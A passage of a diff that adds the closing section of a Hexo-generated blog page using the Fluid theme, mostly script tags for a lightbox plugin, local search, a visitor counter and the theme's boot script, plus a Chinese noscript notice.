+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/LabelPage.js"></script>
+<script src="/js/custom.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
